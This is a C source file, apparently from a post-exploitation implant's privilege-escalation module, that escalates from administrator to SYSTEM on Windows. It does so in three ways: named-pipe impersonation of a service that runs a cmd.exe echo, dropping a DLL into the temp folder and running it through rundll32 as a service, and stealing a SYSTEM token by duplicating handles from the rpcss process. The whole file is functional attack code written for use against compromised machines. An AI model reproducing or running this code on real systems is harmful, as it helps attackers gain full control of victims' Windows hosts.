#include <winternl.h>
#include "precomp.h"
#include "common_metapi.h"
#include "namedpipe.h"
#include "service.h"

typedef DWORD (*Callback)(LPVOID);

typedef enum _OBJECT_INFORMATION_CLASS {
	ObjectBasicInformation = 0,
	ObjectTypeInformation = 2
} OBJECT_INFORMATION_CLASS;

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
typedef NTSTATUS(WINAPI* NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef NTSTATUS(WINAPI* NTQUERYOBJECT)(HANDLE Handle, DWORD ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);

typedef enum _PROCESSINFOCLASS
{
	ProcessBasicInformation = 0,
	ProcessHandleInformation = 51,
} PROCESSINFOCLASS;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
	HANDLE HandleValue;
	ULONG_PTR HandleCount;
	ULONG_PTR PointerCount;
	ACCESS_MASK GrantedAccess;
	ULONG ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION
{
	_UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	UCHAR TypeIndex;
	CHAR ReservedByte;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

BOOL is_equal_luid(const PLUID luid1, const PLUID luid2) {
	return ((luid1->HighPart == luid2->HighPart) && (luid1->LowPart == luid2->LowPart));
}

DWORD post_callback_use_self(Remote* remote);

// TODO: clean this function up
DWORD get_token_object_index(PULONG TokenIndex)
{
	HANDLE hToken;
	BOOL bRes;
	NTSTATUS status;
	HMODULE hNtdll = NULL;
	NTQUERYOBJECT pNtQueryObject = NULL;
	
	struct
	{
		OBJECT_TYPE_INFORMATION TypeInfo;
		WCHAR TypeNameBuffer[sizeof("Token")];
	} typeInfoWithName;

	//
	// Open the current process token
	//
	bRes = OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken);
	if (bRes == FALSE)
	{
		dprintf("[ELEVATE] get_token_object_index. OpenProcessToken failed");
		return HRESULT_FROM_WIN32(GetLastError());
	}

	hNtdll = GetModuleHandle("ntdll");
	if (hNtdll == NULL) {
		dprintf("[ELEVATE] get_token_object_index. GetModuleHandle(\"ntdll\") failed");
		// TODO: dprintf a message here
		return GetLastError();
	}

	pNtQueryObject = (NTQUERYOBJECT)(GetProcAddress(hNtdll, "NtQueryObject"));
	if (pNtQueryObject == NULL) {
		dprintf("[ELEVATE] get_token_object_index. GetProcAddress(hNtdll, \"NtQueryObject\") failed");
		// TODO: dprintf a message here
		return GetLastError();
	}

	//
	// Get the object type information for the token handle
	//
	status = pNtQueryObject(hToken,
		ObjectTypeInformation,
		&typeInfoWithName,
		sizeof(typeInfoWithName),
		NULL);
	CloseHandle(hToken);
	if (!NT_SUCCESS(status))
	{
		dprintf("[ELEVATE] get_token_object_index. NtQueryObject failed");
		return HRESULT_FROM_NT(status);
	}

	//
	// Return the object type index
	//
	*TokenIndex = typeInfoWithName.TypeInfo.TypeIndex;
	dprintf("[ELEVATE] get_token_object_index. token index: %ul", typeInfoWithName.TypeInfo.TypeIndex);
	return ERROR_SUCCESS;
}
// TODO: clean this function up
DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
{
	NTSTATUS status;
	PROCESS_HANDLE_SNAPSHOT_INFORMATION localInfo;
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION handleInfo = &localInfo;
	ULONG bytes;
	ULONG tokenIndex;
	ULONG i;
	HRESULT hResult = ERROR_UNIDENTIFIED_ERROR;
	BOOL bRes;
	HANDLE dupHandle;
	TOKEN_STATISTICS tokenStats;
	LUID systemLuid = SYSTEM_LUID;
	HMODULE hNtdll = NULL;
	NTQUERYINFORMATIONPROCESS pNtQueryInformationProcess = NULL;

	//
	// Get the Object Type Index for Token Objects so we can recognize them
	//
	if (FAILED(get_token_object_index(&tokenIndex))) {
		dprintf("[ELEVATE] get_system_token. get_token_object_index failed");
		goto Failure;
	}

	hNtdll = GetModuleHandle("ntdll");
	if (hNtdll == NULL) {
		dprintf("[ELEVATE] get_system_token. GetModuleHandle(\"ntdll\") failed");
		return ERROR_UNIDENTIFIED_ERROR;
	}

	pNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
	if (pNtQueryInformationProcess == NULL) {
		dprintf("[ELEVATE] get_system_token. GetProcAddress(hNtdll, \"NtQueryInformationProcess\") failed");
		return ERROR_UNIDENTIFIED_ERROR;
	}

	dprintf("[ELEVATE] resolved NtQueryInformationProcess");
	//
	// Check how big the process handle list is
	//
	status = pNtQueryInformationProcess(hProc,
		ProcessHandleInformation,
		handleInfo,
		sizeof(*handleInfo),
		&bytes);
	if (NT_SUCCESS(status))
	{
		dprintf("[ELEVATE] get_system_token. NtQueryInformationProcess failed");
		goto Failure;
	}

	//
	// Add space for 16 more handles and try again
	//
	bytes += 16 * sizeof(*handleInfo);
	handleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
	status = pNtQueryInformationProcess(hProc, ProcessHandleInformation, handleInfo, bytes, NULL);
	if (!NT_SUCCESS(status))
	{
		dprintf("[ELEVATE] get_system_token. failed to allocate enough space for NtQueryInformationProcess");
		goto Failure;
	}

	dprintf("[ELEVATE] get_system_token. retrieved process handle information (number: %u)", handleInfo->NumberOfHandles);

	//
	// Enumerate each one
	//
	for (i = 0; i < handleInfo->NumberOfHandles; i++)
	{
		//
		// Check if it's a token handle with full access
		//
		if (handleInfo->Handles[i].ObjectTypeIndex != tokenIndex) {
			continue;
		}

		if (handleInfo->Handles[i].GrantedAccess != 0xf01ff) {
			//dprintf("[ELEVATE] get_system_token. token object is missing all access (GrantedAccess: %#08x)", handleInfo->Handles[i].GrantedAccess);
			continue;
		}

		//
		// Duplicate the token so we can take a look at it
		//
		bRes = DuplicateHandle(hProc,
			handleInfo->Handles[i].HandleValue,
			GetCurrentProcess(),
			&dupHandle,
			0,
			TRUE,
			DUPLICATE_SAME_ACCESS);
		if (bRes == FALSE)
		{
			dprintf("[ELEVATE] get_system_token. DuplicateHandle failed");
			goto Failure;
		}

		//
		// Get information on the token
		//
		if (!GetTokenInformation(dupHandle, TokenStatistics, &tokenStats, sizeof(tokenStats), &bytes)) {
			dprintf("[ELEVATE] get_system_token. GetTokenInformation failed");
			CloseHandle(dupHandle);
			goto Failure;
		}

		dprintf("[ELEVATE] get_system_token. retrieved the token information");

		if (!is_equal_luid(&tokenStats.AuthenticationId, &systemLuid)) {
			dprintf("[ELEVATE] get_system_token. token is not SYSTEM");
			CloseHandle(dupHandle);
			continue;
		}

		dprintf("[ELEVATE] get_system_token. analyzing handle: 0x%#08x", handleInfo->Handles[i].HandleValue);

		//
		// Check if its a system token with all of its privileges intact
		//
		if (tokenStats.PrivilegeCount < 22) { // TODO: set this back to 22 for Windows 10
			dprintf("[ELEVATE] get_system_token. token is missing privileges (count: %u)", tokenStats.PrivilegeCount);
			CloseHandle(dupHandle);
			continue;
		}

		HANDLE hThread = GetCurrentThread();
		if (!SetThreadToken(&hThread, dupHandle)) {
			dprintf("[ELEVATE] get_system_token. SetThreadToken failed <---------------------");
			CloseHandle(dupHandle);
			continue;
		}

		*phToken = dupHandle;
		//SetThreadToken(GetCurrentThread(), dupHandle);

		dprintf("[ELEVATE] Found a SYSTEM token");
		//
		// Get out of the loop
		//
		hResult = ERROR_SUCCESS;
		break;

	}

Failure:
	//
	// Free the handle list if we had one
	//
	if (handleInfo != &localInfo)
	{
		HeapFree(GetProcessHeap(), 0, handleInfo);
	}
	return hResult;
}

DWORD post_callback_use_rpcss(Remote* remote)
{
	SC_HANDLE hScm = NULL;
	SC_HANDLE hSvc = NULL;
	HANDLE hProc = NULL;
	SERVICE_STATUS_PROCESS procInfo;
	DWORD dwBytes;
	DWORD dwResult = ERROR_ACCESS_DENIED;
	HANDLE hToken = NULL;

	do {
		hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
		if (hScm == NULL) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenSCManager failed");
		}

		// validated to here // TODO: remove this comment

		hSvc = OpenService(hScm, "rpcss", SERVICE_QUERY_STATUS);
		if (hSvc == NULL) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenService failed");
		}

		if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&procInfo, sizeof(procInfo), &dwBytes)) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. QueryServiceStatusEx failed");
		}

		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
		if (hProc == NULL) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenProcess failed");
		}

		if (get_system_token(hProc, &hToken) != ERROR_SUCCESS) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. get_system_token failed");
		}

		dwResult = ERROR_SUCCESS;
		dprintf("[ELEVATE] post_callback_use_rpcss. dispatching to use_self");
		post_callback_use_self(remote);
	} while (0);

	//if (hToken) {
	//	CloseHandle(hToken);
	//	hToken = NULL;
	//}

	if (hProc) {
		CloseHandle(hProc);
		hProc = NULL;
	}

	if (hSvc) {
		CloseServiceHandle(hSvc);
		hSvc = NULL;
	}

	if (hScm) {
		CloseServiceHandle(hScm);
		hScm = NULL;
	}

	// TODO: uncomment this
	//if (dwResult != ERROR_SUCCESS) {
	//	RevertToSelf();
	//}
	return dwResult;
}

/*
 * A post-impersonation callback that simply updates the meterpreter token to the
 * current thread token. This is used by the standard service-based technique.
 */
DWORD post_callback_use_self(Remote * remote)
{
	HANDLE hToken = NULL;
	TOKEN_STATISTICS tokenStats;
	DWORD bytes;
	LUID systemLuid = SYSTEM_LUID;

	// get a handle to this threads token
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
		dprintf("[ELEVATE] post_callback_use_self. OpenThreadToken failed");
		return GetLastError();
	}

	if (!GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &bytes)) {
		dprintf("[ELEVATE] post_callback_use_self. GetTokenInformation failed");
	}
	if (!is_equal_luid(&tokenStats.AuthenticationId, &systemLuid)) {
		dprintf("[ELEVATE] post_callback_use_self. token is **not** SYSTEM");
	}
	else {
		dprintf("[ELEVATE] post_callback_use_self. token is SYSTEM");
	}

	// now we can set the meterpreters thread token to that of our system
	// token so all subsequent meterpreter threads will use this token.
	met_api->thread.update_token(remote, hToken);
	return ERROR_SUCCESS;
}

/*
 * Worker thread for named pipe impersonation. Creates a named pipe and impersonates
 * the first client which connects to it.
 */
DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
{
	DWORD dwResult              = ERROR_ACCESS_DENIED;
	HANDLE hPipe                = NULL;
	HANDLE hSem		            = NULL;
	char * cpPipeName           = NULL;
	Remote * remote             = NULL;
	BYTE bMessage[128]          = {0};
	DWORD dwBytes               = 0;
	Callback fPostImpersonation = NULL;

	do {
		if (!thread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. invalid thread", ERROR_BAD_ARGUMENTS);
		}

		cpPipeName         = (char *)thread->parameter1;
		remote             = (Remote *)thread->parameter2;
		hSem               = (HANDLE)thread->parameter3;
		fPostImpersonation = (Callback)thread->parameter4;

		if (!cpPipeName || !remote) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread.  invalid thread arguments",
				ERROR_BAD_ARGUMENTS);
		}

		dprintf("[ELEVATE] pipethread. CreateNamedPipe(%s)", cpPipeName);

		// create the named pipe for the client service to connect to
		hPipe = CreateNamedPipe(cpPipeName,
			PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL);

		if (!hPipe) {
			BREAK_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. CreateNamedPipe failed");
		}

		while (TRUE) {
			if (met_api->event.poll(thread->sigterm, 0)) {
				BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. thread->sigterm received",
					ERROR_DBG_TERMINATE_THREAD);
			}

			// signal the client that the pipe is ready
            if (hSem) {
                if (!ReleaseSemaphore(hSem, 1, NULL)) {
					BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. ReleaseSemaphore failed",
						ERROR_DBG_TERMINATE_THREAD);
				}
			}

			// wait for a client to connect to our named pipe...
			if (!ConnectNamedPipe(hPipe, NULL)) {
				if (GetLastError() != ERROR_PIPE_CONNECTED)
					continue;
			}

			dprintf("[ELEVATE] pipethread. receieved a client connection");

			// we can't impersonate a client untill we have performed a read on the pipe...
			if (!ReadFile(hPipe, &bMessage, 1, &dwBytes, NULL)) {
				CONTINUE_ON_ERROR("[ELEVATE] pipethread. ReadFile failed");
			}

			// impersonate the client!
			if (!ImpersonateNamedPipeClient(hPipe)) {
				CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. ImpersonateNamedPipeClient failed");
			}

			if (fPostImpersonation) {
				dwResult = fPostImpersonation(remote);
				if (dwResult != ERROR_SUCCESS) {
					CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. the post impersonation callback failed");
				}
			}
			else {
				dwResult = ERROR_SUCCESS;
			}

			break;
		}

	} while (0);

	if (hPipe) {
		DisconnectNamedPipe(hPipe);
		CLOSE_HANDLE(hPipe);
	}

	dprintf("[ELEVATE] elevate_namedpipe_thread finishing, dwResult=%d", dwResult);
	return dwResult;
}

/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a cmd.exe under local
 * system which then connects to our named pipe and we impersonate this client. This can be done by an
 * Administrator without the need for SeDebugPrivilege.  Works on 2000, XP, 2003 and 2008 for all local
 * administrators. On Vista and 7 it will only work if the host process has been elevated through UAC
 * first. Does not work on NT4.
 */
DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
{
	DWORD dwResult              = ERROR_SUCCESS;
	char * cpServiceName        = NULL;
	THREAD * pThread            = NULL;
	HANDLE hSem                 = NULL;
	char cServiceArgs[MAX_PATH] = {0};
	char cServicePipe[MAX_PATH] = {0};
	OSVERSIONINFO os            = {0};

	do {
		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

		if (!GetVersionEx(&os)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: GetVersionEx failed")
		}

		// filter out Windows NT4
		if (os.dwMajorVersion == 4 && os.dwMinorVersion == 0) {
			SetLastError(ERROR_ACCESS_DENIED);
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: Windows NT4 not supported.")
		}

		cpServiceName = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
		if (!cpServiceName) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. invalid arguments",
				ERROR_BAD_ARGUMENTS);
		}

		_snprintf_s(cServicePipe, sizeof(cServicePipe), MAX_PATH,
			"\\\\.\\pipe\\%s", cpServiceName);

		_snprintf_s(cServiceArgs, sizeof(cServiceArgs), MAX_PATH,
			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, (Callback)post_callback_use_self);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.create failed",
				ERROR_INVALID_HANDLE);
		}

		if (!met_api->thread.run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.run failed",
				ERROR_ACCESS_DENIED);
		}

		// wait for the thread to create the pipe, if it times out terminate
        if (hSem) {
		    if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
			    BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. WaitForSingleObject failed",
					ERROR_ACCESS_DENIED);
			}
        } else {
            Sleep(500);
		}

		// start the elevator service (if it doesn't start first time we need to create it and then start it).
		if (service_start(cpServiceName) != ERROR_SUCCESS) {
			dprintf("[ELEVATE] service starting failed, attempting to create");
			if (service_create(cpServiceName, cServiceArgs) != ERROR_SUCCESS) {
				BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe. service_create failed");
			}
			dprintf("[ELEVATE] creation of service succeeded, attempting to start");
			// we don't check a return value for service_start as we expect it to fail as cmd.exe is not
			// a valid service and it will never signal to the service manager that is is a running service.
			service_start(cpServiceName);
		}

		// signal our thread to terminate if it is still running
		met_api->thread.sigterm(pThread);

		// and wait for it to terminate...
		met_api->thread.join(pThread);

		// get the exit code for our pthread
		dprintf("[ELEVATE] dwResult before exit code: %u", dwResult);
		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. GetExitCodeThread failed",
				ERROR_INVALID_HANDLE);
		}
		dprintf("[ELEVATE] dwResult after exit code: %u", dwResult);

	} while (0);

	if (cpServiceName) {
		service_stop(cpServiceName);
		service_destroy(cpServiceName);
	}

	if (pThread) {
		met_api->thread.destroy(pThread);
	}
	if (hSem) {
		CloseHandle(hSem);
	}

	return dwResult;
}

/*
 * Elevate from local admin to local system via Named Pipe Impersonation. We spawn a service under local
 * system which then connects to our named pipe and we impersonate this client. This can be done by an
 * Administrator without the need for SeDebugPrivilege, however a dll (elevator.dll) must be written to
 * disk. Works on NT4, 2000, XP, 2003 and 2008 for all local administrators. On Vista and 7 it will only
 * work if the host process has been elevated through UAC first.
 */
DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
{
	DWORD dwResult              = ERROR_SUCCESS;
	THREAD * pThread            = NULL;
	HANDLE hServiceFile         = NULL;
	HANDLE hSem		    = NULL;
	LPVOID lpServiceBuffer      = NULL;
	char * cpServiceName        = NULL;
	THREAD * pthread            = NULL;
	char cServicePath[MAX_PATH] = {0};
	char cServiceArgs[MAX_PATH] = {0};
	char cServicePipe[MAX_PATH] = {0};
	char cTempPath[MAX_PATH]    = {0};
	DWORD dwBytes               = 0;
	DWORD dwTotal               = 0;
	DWORD dwServiceLength       = 0;

	do
	{
		cpServiceName   = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
		dwServiceLength = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH);
		lpServiceBuffer = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_DLL);

		if (!cpServiceName || !dwServiceLength || !lpServiceBuffer) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. invalid arguments",
				ERROR_BAD_ARGUMENTS);
		}

		if (GetTempPath(MAX_PATH, (LPSTR)&cTempPath) == 0) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe2. GetTempPath failed");
		}

		if (cTempPath[ strlen(cTempPath) - 1 ] == '\\') {
			_snprintf_s(cServicePath, sizeof(cServicePath), MAX_PATH, "%s%s.dll", cTempPath, cpServiceName);
		} else {
			_snprintf_s(cServicePath, sizeof(cServicePath), MAX_PATH, "%s\\%s.dll", cTempPath, cpServiceName);
		}

		_snprintf_s(cServiceArgs, sizeof(cServiceArgs), MAX_PATH, "rundll32.exe %s,a /p:%s", cServicePath, cpServiceName);

		_snprintf_s(cServicePipe, sizeof(cServicePipe), MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName);

		// write service dll to temp path...
		hServiceFile = CreateFile(cServicePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!hServiceFile) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe2. CreateFile hServiceFile failed");
		}

		while (dwTotal < dwServiceLength) {
			if (!WriteFile(hServiceFile,
				(LPCVOID)((LPBYTE)lpServiceBuffer + dwTotal),
				(dwServiceLength - dwTotal), &dwBytes, NULL)) {
				break;
			}
			dwTotal += dwBytes;
		}

		CLOSE_HANDLE(hServiceFile);

		if (dwTotal != dwServiceLength) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. WriteFile hServiceFile failed",
				ERROR_BAD_LENGTH);
		}

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, (Callback)post_callback_use_self);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
				ERROR_INVALID_HANDLE);
		}

		if (!met_api->thread.run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
				ERROR_ACCESS_DENIED);
		}

		//wait for the thread to create the pipe(if it times out terminate)
        if (hSem) {
			if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
				BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. WaitForSingleObject failed",
					ERROR_ACCESS_DENIED);
			}
        } else {
                Sleep(500);
		}

		// start the elevator service (if it doesnt start first time we need to create it and then start it).
		if (service_start(cpServiceName) != ERROR_SUCCESS) {
			if (service_create(cpServiceName, cServiceArgs) != ERROR_SUCCESS) {
				BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe2. service_create failed");
			}

			if (service_start(cpServiceName) != ERROR_SUCCESS) {
				BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe2. service_start failed");
			}
		}

		WaitForSingleObject(pThread->handle, 10000);

		met_api->thread.sigterm(pThread);

		met_api->thread.join(pThread);

		// get the exit code for our pthread
		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. GetExitCodeThread failed",
				ERROR_INVALID_HANDLE);
		}

	} while (0);

	if (cpServiceName) {
		service_stop(cpServiceName);
		service_destroy(cpServiceName);
	}

	if (strlen(cServicePath) > 0) {
		DWORD dwIndex = 20;
		while (dwIndex--) {
			if (DeleteFile(cServicePath)) {
				break;
			}
			Sleep(500);
		}
	}

	if (pThread) {
		met_api->thread.destroy(pThread);
	}

	if (hSem) {
		CloseHandle(hSem);
	}

	return dwResult;
}

DWORD elevate_via_service_namedpipe_rpcss(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_ACCESS_DENIED;
	THREAD* pThread = NULL;
	HANDLE hSem = NULL;
	char cServicePipe[MAX_PATH] = { 0 };
	OSVERSIONINFO os = { 0 };
	HANDLE hPipe = NULL;

	// TODO: update log message function names in here
	do {
		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

		if (!GetVersionEx(&os)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: GetVersionEx failed")
		}

		// filter out Windows NT4 // TODO: Update this to XP per https://windows-internals.com/faxing-your-way-to-system/ (An Elevated Fax)
		if (os.dwMajorVersion == 4 && os.dwMinorVersion == 0) {
			SetLastError(ERROR_ACCESS_DENIED);
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: Windows NT4 not supported.")
		}

		// TODO: randomize this name
		_snprintf_s(cServicePipe, sizeof(cServicePipe), MAX_PATH,
			"\\\\.\\pipe\\pipey1");

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, (Callback)post_callback_use_rpcss);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.create failed",
				ERROR_INVALID_HANDLE);
		}

		if (!met_api->thread.run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.run failed",
				ERROR_ACCESS_DENIED);
		}

		// wait for the thread to create the pipe, if it times out terminate
		if (hSem) {
			if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
				BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. WaitForSingleObject failed",
					ERROR_ACCESS_DENIED);
			}
		}
		else {
			Sleep(500);
		}

		hPipe = CreateFile("\\\\localhost\\pipe\\pipey1", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hPipe == INVALID_HANDLE_VALUE) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe. CreateFile failed");
		}
		
		if (!WriteFile(hPipe, "\x00", 1, NULL, NULL)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe. WriteFile failed");
		}


		WaitForSingleObject(pThread->handle, 5000);
		met_api->thread.sigterm(pThread);
		met_api->thread.join(pThread);

		// get the exit code for our pthread
		dprintf("[ELEVATE] dwResult before exit code: %u", dwResult);
		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. GetExitCodeThread failed",
				ERROR_INVALID_HANDLE);
		}
		dprintf("[ELEVATE] dwResult after exit code: %u", dwResult);

	} while (0);

	if (hPipe) {
		CloseHandle(hPipe);
	}
	if (pThread) {
		met_api->thread.destroy(pThread);
	}
	if (hSem) {
		CloseHandle(hSem);
	}

	return dwResult;
}